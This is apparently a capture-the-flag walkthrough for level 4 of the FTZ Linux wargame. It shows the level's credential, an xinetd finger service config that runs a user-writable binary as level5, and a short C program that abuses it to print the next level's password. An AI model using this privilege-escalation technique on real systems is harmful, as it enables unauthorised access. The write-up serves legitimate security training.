### Credential
```
level4 / suck my brain
```

### Solution
```
[level4@ftz level4]$ ls
hint  public_html  tmp

[level4@ftz level4]$ cat hint 


누군가 /etc/xinetd.d/에 백도어를 심어놓았다.!

[level4@ftz level4]$ cd /etc/xinetd.d/

[level4@ftz xinetd.d]$ ls -al
total 88
drwxr-xr-x    2 root     root         4096 Sep 10  2011 .
drwxr-xr-x   52 root     root         4096 Aug 13 01:35 ..
-r--r--r--    1 root     level4        171 Sep 10  2011 backdoor
-rw-r--r--    1 root     root          560 Dec 19  2007 chargen
-rw-r--r--    1 root     root          580 Dec 19  2007 chargen-udp
-rw-r--r--    1 root     root          417 Dec 19  2007 daytime
-rw-r--r--    1 root     root          437 Dec 19  2007 daytime-udp
-rw-r--r--    1 root     root          339 Dec 19  2007 echo
-rw-r--r--    1 root     root          358 Dec 19  2007 echo-udp
-rw-r--r--    1 root     root          317 Dec 19  2007 finger
-rw-r--r--    1 root     root          273 Dec 19  2007 ntalk
-rw-r--r--    1 root     root          359 Dec 19  2007 rexec
-rw-r--r--    1 root     root          376 Dec 19  2007 rlogin
-rw-r--r--    1 root     root          429 Dec 19  2007 rsh
-rw-r--r--    1 root     root          317 Dec 19  2007 rsync
-rw-r--r--    1 root     root          310 Dec 19  2007 servers
-rw-r--r--    1 root     root          312 Dec 19  2007 services
-rw-r--r--    1 root     root          406 Dec 19  2007 sgi_fam
-rw-r--r--    1 root     root          261 Dec 19  2007 talk
-rw-r--r--    1 root     root          305 Sep 10  2011 telnet
-rw-r--r--    1 root     root          495 Dec 19  2007 time
-rw-r--r--    1 root     root          515 Dec 19  2007 time-udp

[level4@ftz xinetd.d]$ cat backdoor 
service finger 
{
	disable	= no
	flags		= REUSE
	socket_type	= stream        
	wait		= no
	user		= level5
	server		= /home/level4/tmp/backdoor
	log_on_failure	+= USERID
}

[level4@ftz xinetd.d]$ cd /home/level4/tmp/

[level4@ftz tmp]$ cat backdoor.c 
#include<stdlib.h>

int main()
{
	system("my-pass");
	return 0;
}

[level4@ftz tmp]$ gcc -o backdoor backdoor.c 

[level4@ftz tmp]$ finger root@localhost
^[[H^[[J
Level5 Password is "what is your name?".
```
